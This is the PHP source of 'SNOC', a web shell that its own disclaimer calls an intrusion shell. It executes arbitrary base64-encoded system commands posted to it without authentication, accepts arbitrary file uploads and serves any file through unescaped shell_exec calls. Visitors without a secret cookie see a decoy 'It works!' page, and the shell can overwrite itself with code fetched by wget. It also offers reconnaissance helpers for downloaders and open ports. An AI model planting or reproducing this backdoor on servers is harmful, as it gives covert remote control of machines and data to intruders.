<?php 

define('SNOC_VERSION', '1.03');
define('SNOC_CODENAME', 'Floppydisk');

/**
returns boolean if page opend as shell command
*/
function checkCommand()
{
	return isset($_POST['c']);
	
}

/**
runs command and echos commandresults
*/
function runCommand()
{
	ob_start();
	$out=shell_exec(base64_decode($_POST['c']));
	if(is_null($out))
	{
		$out = ob_get_contents();
	}
	ob_end_clean();
	// HTML Escaping with htmlentities
	echo(base64_encode("<br/>".nl2br(htmlentities($out))));
}

/**
 * check version
*/
function checkVersionCheck()
{
	if (isset($_POST['versionCheck'])) {
		return true;
	}
	return false;
}

/**
run fileupload
*/
function checkFileUpload()
{
	if(isset($_GET['f']))
	{
		return true;
	}else if(isset($_GET['foo']))
	{
		$target_path =  basename( $_FILES['foo']['name']); 
		if(move_uploaded_file($_FILES['foo']['tmp_name'], $target_path)) {
			echo "The file ".basename($_FILES['foo']['name']). 
			" has been uploaded";
		} else{
			echo "There was an error uploading the file, please try again!";
		}
		return true;
	}
	return false;
}
/**
run filedownload
*/
function checkFileDownload()
{
	if(isset($_GET['d']))
	{
		return true;
	}
	return false;
}

/**
 * do version check
*/
function doVersionCheck()
{
	$versionString = false;
	// we open a socket because we have no guarantee that file_get_conents is enabled
	$f = fsockopen('ssl://raw.github.com', 443);
	$request = "GET /tjosten/SNOC/master/version.json HTTP/1.1\r\n";
	$request.= "Host: raw.github.com\r\n";
	$request.= "Connection: Close\r\n\r\n";
	fwrite($f, $request);
	while(!feof($f)) {
		$l = fgets($f, 128);
		if (strstr($l, '{')) {
			$versionString = $l;
		}
	}
	fclose($f);

	if (!$versionString)
		die(json_encode(array('success' => false)));
	else
		die($versionString);

	#'https://raw.github.com/tjosten/SNOC/master/version.json';
	#var_dump($version);
	#echo $version;
}

/**
show filedownload
*/
function showFileDownload()
{
	$file = base64_decode($_GET['d']);
	header('Content-type:'.shell_exec('file -i -b '.$file));
	header('Content-Disposition: attachment; filename='.basename($file));
	echo shell_exec('cat '.$file);
}


/**
show fileupload
*/
function showFileUpload()
{
	echo '
	<form enctype="multipart/form-data" action="'.basename(__FILE__).'?foo=1" method="POST" style="font-size:12px;font-family: monospace;">
	Upload to:'.dirname(__FILE__).'<br/><input name="foo" type="file" />
	<input type="submit" value="Do" />
	</form>';
}

/**
echos whole shell as HTML and JS
*/
function echoShell()
{
	echoHead();
	echoJS();
	echoFoot();
}

/**
echos ending HTML part
*/
function echoFoot()
{
	echo '<title>SNOC - Shell is Not an Oil Company</title>
			</head>
			<body style="text-align:center;">
				<div id="shell">
			    	<div id="out"></div>
					<input type="text" name="input" value="" id="command" />
				    <div id="dir"></div>
				    <div id="action">
				    	<select name="action" id="selection">
				    		<option value="0">Weitere Funktionen ...</option>
				    		<option value="3">ping</option>
				    		<option value="2">which downloader</option>
				    		<option value="4">show opened ports</option>
				    		<option value="5">active connections</option>
				    	</select>
				    </div>
				</div>
				<div>
					<!--<iframe src="'.basename(__FILE__).'?f=1" width="600"></iframe>-->
				</div>
			</body>
		</html>';
}

/**
echos JS part
*/
function echoJS()
{
	echo '<script type="text/javascript" language="javascript">
	// <![CDATA[
	';
	?>

	$.ctrl = function(key, callback, args) {
	    var isCtrl = false;
	    $(document).keydown(function(e) {
	        if(!args) args=[]; // IE barks when args is null

	        if(e.ctrlKey) isCtrl = true;
	        if(e.keyCode == key.charCodeAt(0) && isCtrl) {
	            callback.apply(this, args);
	            return false;
	        }
	    }).keyup(function(e) {
	        if(e.ctrlKey) isCtrl = false;
	    });
	};

	function Shell(){
		var snoc_version = "<?=SNOC_VERSION?>";
		var snoc_version_codename = "<?=SNOC_CODENAME?>";
		var current_dir = "<?php echo dirname(__FILE__);  ?>";	// current directory
		var self_name = window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);
		var history = new Array();				// command history stack
		var history_pos = 0;					// history position
		
		// ------SETUP AUTOCOMPLETION
		// standard commands (in case path cannot be read later on)			
		var knownCommands = ["ls","cd","clear","man","ping","netstat","more","less","diff","rm","mkdir","mv","cp","wc","chmod","cat", "snocupdate"];
		var displayAll = false;					// to display all commands when tab is pushed
		var tempFoundCommands = [];				// temporary array to display all matching commands for an input
		var displayed = false;					// true when matching commands have already been displayed
		readPath();						// read commands from path (and add to knownCommands)

		var aliases = {ll:"ls -l",la:"ls -a"}; // predefined aliases

		$("#command").focus();					// Focus the command line with cursor
		$("#dir").empty().append(current_dir);			// Display current direcory
		for(var i=0;i<2;i++)					// Look and feel (includes 21 <br>s)
			$("#out").append("<br/>");
		
		printShell('<pre style="margin-left: 50px"> #####  #     # #######  #####<br />'+  
'#     # ##    # #     # #     #<br />'+
'#       # #   # #     # #      <br />'+ 
' #####  #  #  # #     # #       <br />'+
'      # #   # # #     # #       <br />'+
'#     # #    ## #     # #     # <br />'+
' #####  #     # #######  #####  <br />'+                                
'</pre><br />');

		printShell('<span style="margin-left:50px">Shell is Not an Oil Company</span><br /><br /><span style="margin-left:50px;">Version '+snoc_version+' '+snoc_version_codename+'</span><br /><br />');
	
		printShell("<p>Welcome to the SNOC shell. For more info on what you can do with SNOC, type 'help' on the prompt.</p>"+
		"<p><b>DISCLAIMER:</b> Although SNOC has been designed as an intrusion shell, please notice that we refuse to be held "+ 
		"responsible for usage that results in illegal actions. We strongly advise you to use SNOC only for testing and demo "+ 
		"purposes.<br /><br /></p>");		

		// run version check
		versionCheck();

		// ------ FIRST SYS INFO
		printShell("Current user/server setup:");
		postShell("uname -a",function(data) {
			printShell(data);
		});
	
		// ------ RUN
		function runCommand(){
			var command = $("#command").val().trim();	// reads command
			addToHistory(command);
			var commandArgs = new Array();
			var commandName = command; // default, if no arguments
			if (command.indexOf(" ") != -1) {
				commandArgs = command.split(" "); // includes command name as first entry
				commandName = commandArgs[0]; // command name without arguments
			}
			
			// print out command
			printShell("<br /><span style='color: #46CF4F'>"+current_dir+"></span>&nbsp;"+command);

			// lookup aliases and replace
			for (var alias in aliases) {
				if (commandName==alias) {
					printShell("<br />"+aliases[commandName]);
					commandName = aliases[commandName];
					command = commandName;
					for (var i = 1; i < commandArgs.length; i++) { // re-construct command from new command name and args
						command = command + " " + commandArgs[i];
					}
				}
			}

			// special commands
			switch(commandName) {
				case "clear":
					$("#out").empty();
					$("#command").val("");
					for(var i=0;i<21;i++)
						$("#out").append("<br/>");
				break;
				case "help":
					$("#command").val("");
					printHelp();
				break;
				case "alias":
					$("#command").val("");
					doAlias(commandArgs[1]);
				break;
				case "snocupdate":
					$("#command").val("");
					doSnocUpdate();
				break;
				// TODO: Add new special commands here !
				case "":break;
				// Default command
				default:
					// empty the command value
					$("#command").val("");
					
					// fullcommand is 
					// 	-> navigate to current dir
					//	-> run command
					//	-> with 2>&1 (pipes stderr for every command)
					//	-> return the new current dir
					var fullcommand = "cd "+current_dir+";"+command+" 2>&1;pwd";
					postShell(fullcommand,function(data){
						if(command.match(/^download/) != null)
						{
							startDownload(command);
							return;
						}
						for(var i=data.length-3;i>0;i--) {
							if(data[i] == ">")
								break;
						}
						var output= data.substr(0,i+1);	// substr the output !
						
						// substr the current dir and delete <br/> tag and newline
						current_dir = data.substr(i+1,data.length).replace(/(<([^>]+)>)/ig,"").replace(/\n/g,"");
						printShell(output);
						$("#dir").empty().append(current_dir);	// update the current_dir field
					});
				break;
			}
		}
		

		// ------ HISTORY
		function addToHistory(cmd)
		{
			history.push(cmd);
			history_pos = history.length;
		}
		
		// load previous command with n < 1 and next command with n >= 1
		function loadHistory(n)
		{
			if( n<1 )
			{
				if (history_pos < history.length) {
					$("#command").val(history[history_pos]);
					history_pos++;
					return;
				}
			}
			else
			{
				if (history_pos > 0) {
					$("#command").val(history[history_pos-1]);
					history_pos--;
					return;
				}
			}
			$("#command").val("");		// empty commandarea when end of history reached
		}
		
		// ------ DOWNLOAD FILE
		function startDownload(command)
		{
			file = current_dir+"/"+command.substr(8,command.length).trim();
			window.open("?d="+btoa(file));
		}
		
		// ------ AUTOCOMPLETION
		// autocomplete input
		function autocomplete()
		{
			var foundCommands = new Array(); // commands that match the input
			var input = $("#command").val();
			for (c in knownCommands) {
				if (knownCommands[c].substring(0,input.length)===input) { // if command starts with input
					foundCommands.push(knownCommands[c]); // add command
				}
			}
			
			if (foundCommands.length==1) { // if exactly one command is found
				$("#command").val(foundCommands[0]); // autocomplete
			} else if (foundCommands.length>1) { // alert if more than one match
				var len = foundCommands.length;
				printShell("Display all "+len+" possibilities? (Press TAB)<br />");
				displayAll = true;	// next tab will display all possibilities
				tempFoundCommands = foundCommands;
			}
		}

		// display all matching commands for the input
		function allCommands() {
			for (c in tempFoundCommands) {
				printShell(tempFoundCommands[c]+" ");
			}
			printShell("<br />");
			displayed = true;	// so as to ignore another tab key input
		}

		// read commands from the path and add to known
		function readPath() {
			postShell("echo $PATH",function(pathList){
				var pathFolders=pathList.split(":");		// does this work for every Unix?
				for (p in pathFolders) {			// read commands from every folder
					var folder = pathFolders[p].replace(/<br\s*\/>/g,''); // strip <br />
					postShell("ls "+pathFolders[p],function(cList) {
						var commands = cList.split(/<br\s*\/>/g);
						for (c in commands) {
							var command = commands[c].trim();
							if (!contains(knownCommands,command)) { // do not add duplicates
								knownCommands.push(command);
							}
						}
					});
				}
			});
		}

		// ------ OTHER
		// helpfile
		function printHelp(){
			printShell("<br/><br/><table>"+
			"<tr><th width=150>Functions</th><th>Usage</th></tr>"+
			"<tr><td>download [file]</td><td>download [file] from current directory</td></tr>"+
			"<tr><td>snocupdate</td><td>snoc shell auto update</td></tr>"+
			"<tr><td>clear</td><td>clear shell prompt</td></tr>"+
			"</table><br/><br/>");
		}

		// doSnocUpdate
		function doSnocUpdate() {
			printShell("<br />Starting snoc shell auto update..<br />");
			console.log(current_dir+"/test-"+self_name);
			//return;
			lolWAS = 'https:/';
			command = "wget '"+lolWAS+"/raw.github.com/tjosten/SNOC/master/snoc.php' -O "+current_dir+"/"+self_name;
			var fullcommand = "cd "+current_dir+";"+command+" 2>&1;pwd";
			postShell(fullcommand,function(data){
				for(var i=data.length-3;i>0;i--) {
					if(data[i] == ">")
						break;
				}
				var output= data.substr(0,i+1);	// substr the output !

				abort = false;
				if (output.match("not found")) {
					output = "wget not found. Download failed.<br />";
					abort = true;
				}
				
				// substr the current dir and delete <br/> tag and newline
				current_dir = data.substr(i+1,data.length).replace(/(<([^>]+)>)/ig,"").replace(/\n/g,"");
				printShell(output);
				$("#dir").empty().append(current_dir);	// update the current_dir field
				if (!abort)
					location.reload();
			});
		}

		// execute the alias command
		function doAlias(argument){ // arguments[0] is "alias"
			printShell("<br />");
			// no arg: display all aliases
			if (argument==null) {
				for (a in aliases) {
					printShell("alias "+a+"="+aliases[a]+"<br />");
				}
			} // arg just alias name: display the alias
			else if (argument.indexOf("=") == -1) {
				printShell("alias "+argument+"="+aliases[argument]+"<br />");
			} else { // define a new alias
				var parts = argument.split("=");
				var command = parts[1];
				aliases[parts[0]] = parts[1];
			}
		}

		// ------ GENERAL UTILITY FUNCTIONS
		// print function for convenience - appends string to the shell (without newline) and adjusts scrolling
		function printShell(string) {
			$("#out").append(string);
			$("#out").animate({scrollTop: $("#out")[0].scrollHeight});	// scroll to bottom
		}

		// check if an array contains a value
		function contains(array,element) {
			for (i in array) { if (array[i]==element) return true; }
			return false;
		}

		// post a command to the shell - callback function will be executed with the shell's response as its argument
		// this takes care of all the encoding and decoding from/to base64!
		function postShell(command,callback) {
			var b64 = btoa(command); // encode command
			$.post("",{"c":b64},function(data) {
				var decoded = atob(data); // decode result
				callback(decoded);
			});
		}

		// checks through "self-proxy" for new version
		function versionCheck() {
			$.post("",{"versionCheck":true},function(data) {
				if (data.success == false) {
					printShell('<br /><p style="color:red">Version check failed. Please consider manual update or try \'snocupdate\'.</p>');
				} else {
					console.log(data);
					if (data.version > snoc_version) {
						update_string = 'Most recent snoc version: '+data.version+' '+data.codename+'. <br /><u>Update recommended! Type \'snocupdate\' for snoc auto update';
					} else {
						update_string = 'Most recent snoc version: '+data.version+' '+data.codename+'. No update required.';
					}
					printShell('<br /><p>Installed snoc version: '+snoc_version+' '+snoc_version_codename+' - '+update_string+'</p>');
				}
			}, 'json');			
		}		

		// ------ EVENT HANDLERS		
		$("#command").keydown(function(event){
			var returnVal = true;	// some browsers need this return value set to false to prevent default behaviour
			switch(event.which)
			{
				//Enter pressed
				case 13:
					event.preventDefault();
					runCommand();
					returnVal = false;
				break;
				//Arrow down
				case 38:
					event.preventDefault();
					loadHistory(1);
					returnVal = false;
				break;
				//Arrow up
				case 40:
					event.preventDefault();
					loadHistory(0);
					returnVal = false;
				break;
				//Tab
				case 9:
					event.preventDefault();	// do not lose focus!
					if (!displayAll) {				
						autocomplete();
					} else if (!displayed) {
						allCommands();
					}
					returnVal = false;		// some browsers may need that in addition to preventDefault()
				break;
			}

			// unless Tab
			if (event.which!=9) {
				displayAll = false;
				displayed = false;
				tempFoundCommands = [];
			}

			return returnVal;
		});

		// ctrl event handlers
		$.ctrl('C', function() {
			event.preventDefault();
			$("#command").val("");
			returnVal = false;
		});
		$.ctrl('U', function() {
			event.preventDefault();
			$("#command").val("");
			returnVal = false;
		});		
		$.ctrl('W', function() {
			event.preventDefault();
			$("#command").val($("#command").val().replace(/( ?)\w*$/, ''));
			returnVal = false;
		});		
		
		// drop down selection
		$("#selection").change(function(){
			switch($(this).val().trim())
			{
				case "2":
					$("#command").val("which wget curl w3m lynx");
					runCommand();
					$(this).val(0)
				break;
				
				case "3":
					var ip = prompt("Which IP/Adress");
					$("#command").val("ping -c 3 "+ip);
					runCommand();
					$(this).val(0)
				break;

				case "4":
					$("#command").val("netstat -an | grep -i listen");
					runCommand();
					$(this).val(0)
				break;
				
				case "5":
					$("#command").val("netstat -a");
					runCommand();
					$(this).val(0)
				break;
				
			}
		});
	}


	// if everything is loaded run :
	$(function(){
		var sh = new Shell();

		$('#out').css('height', $(window).height()-40);
		$(window).resize(function() {
			$('#out').css('height', $(window).height()-40);
		});
	});
	
<?php echo '// ]]></script>';
}

/**
echos the headinformation of HTML Content
*/
function echoHead()
{
	echo '<!doctype html>
	<html>  
	<head>
	<style type="text/css" media="screen">
	/*CSS RESETTER*/
	html, body, div, span, applet, object, iframe,
	h1, h2, h3, h4, h5, h6, p, blockquote, pre,
	a, abbr, acronym, address, big, cite, code,
	del, dfn, em, font, img, ins, kbd, q, s, samp,
	small, strike, strong, sub, sup, tt, var,
	dl, dt, dd, ol, ul, li,
	field set, form, label, legend,
	table, caption, tbody, tfoot, thead, tr, th, td { margin:0; padding:0; border:0; outline:0; }
	sub { vertical-align:sub; }
	sup { vertical-align: super; }
	ul, ol { list-style: none; }
	img { border:0 ; }

	body {   
	font-family: monospace;
	}

	#shell{ 
	background-color:#000;
	width:100%;
	margin:0 auto;
	height:100%;
	margin-top:0px;
	color:#FFF;
	text-align:left;
	}


	#command{
	position: absolute;
	width:600px;
	border:none;
	background-color: #222;
	padding:0px;
	margin:0px;
	padding:3px 0px;
	color:#FFF;
	/*top:370px;*/
	left:1px;
	bottom:1px;
	}

	#out{
	height:400px;
	padding: 5px;
	padding-bottom:40px;
	padding-top:0px;
	width:99%;
	overflow-y: scroll;
	overflow-x: hidden;
	}

	#dir{ 
	background-color:#000;  
	position:absolute;
	bottom: 23px;
	left:0px;
	color:#AB1A2D;
	}

	#action{   
	position:absolute;
	bottom: 2px;
	right: 20px;
	color:#FFF;
	}
	</style>
	<link rel="shortcut icon" href="data:image/ico;base64,AAABAAEAEBAAAAAAAABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAABoaGiWaGho/2hoaP9oaGj/aGho/2hoaP9oaGj/aGho/2hoaP9oaGj/aGho/2hoaP9oaGj/aGho/2hoaP9oaGiWampq/yYmJv8mJib/JiYm/yYmJv8mJib/JiYm/yYmJv8mJib/JiYm/yYmJv8mJib/JiYm/yYmJv8nJib/ampq/2xsbP8pKSj/KSko/ykoKP8pKSn/KSkp/ykpKf8oKSn/KSkp/ykpKf8pKSn/KSgo/ykoKf8pKCn/KSkp/2xsbP9vb2//LCws/y0sLf8sLCz/LSws/ywsLP8sLC3/LSws/ywtLP8tLCz/LCwt/ywsLP8sLC3/LC0s/ywtLP9vb2//cnJy/zAwMP8wMDD/MDAw/zAwMP8wLzD/MDAw/zAwMP8wMDD/MDAv/zAwL/8wMDD/MDAw/zAwMP8vMDD/cnJy/3R0dP80NDT/NDQ0/zM0NP80NDT/NDQ0/zQzNP80NDT/NDQ0/zM0M/80NDT/NDQ0/zQ0NP80NDT/NDQz/3R0dP93d3f/ODg4/zg4OP84ODj/WaqD/1mqg/9ZqoP/ODg4/zg4OP84ODj/ODk4/zg4OP84ODj/ODg4/zg4OP93d3f/e3t7/zw8PP9ZqoP/PTw8/zw8PP88PDz/PDw8/zw8Pf88PDz/PDw8/z08PP88PDz/PDw8/zw8PP88PDz/e3t7/35+fv9AQD//QEBA/1mqg/9AQED/QEBA/0BAQP9AP0D/QEBA/0BAP/9AQD//QEBA/0BAQP9AQED/P0BA/35+fv+BgYH/Q0ND/1mqg/9DREP/Q0RD/0NDQ/9DQ0P/REND/0NDRP9DQ0P/Q0ND/0NDQ/9DREP/Q0ND/0NDQ/+BgYH/g4OD/0ZGRf9GRkb/RkVG/0ZGRv9GRUb/RkZG/0ZGRv9GRkb/RkZG/0ZGRv9GRkb/RkZF/0ZGRv9GRkb/g4OD/4aGhv/IyMj/yMjJ/8jIyf/IyMj/yMjJ/8jIyP/IyMj/yMjI/8jIyP/IyMj/yMnI/8jIyf/JyMj/yMjI/4aGhv+JiYn/4eHh/93d3f/d3d3/3d3d/93d3f/d3d3/3d3d/93d3f/d3d3/3d3d/93d3f/d3d3/3d3d/+Hh4f+JiYn/i4uLwOXl5f/t7e3/7Ozs/+zs7P/s7Oz/7Ozs/+zs7P/s7Oz/7Ozs/+zs7P/s7Oz/7Ozs/+3t7f/l5eX/i4uLwI2NjVeNjY3AjY2N/42Njf+NjY3/jY2N/42Njf+NjY3/jY2N/42Njf+NjY3/jY2N/42Njf+NjY3/jY2NwI2NjVf///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAQAA//8AAA=="/>
	<script type="text/javascript" language="javascript" charset="utf-8" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>';
}

if(checkCommand())
{
	runCommand();
}
else if(checkFileUpload())
{
	showFileUpload();
}
else if(checkFileDownload())
{
	showFileDownload();
}
else if (checkVersionCheck())
{
	doVersionCheck();
}
else
{
	// Simple Cookie Authentication
	if($_COOKIE['sca'] && $_COOKIE['sca'] === 'e760dc631f4ec5bc565d62c859b03c04')
		echoShell();
	else
		echo '<h1>It works!</h1>';
}
?>
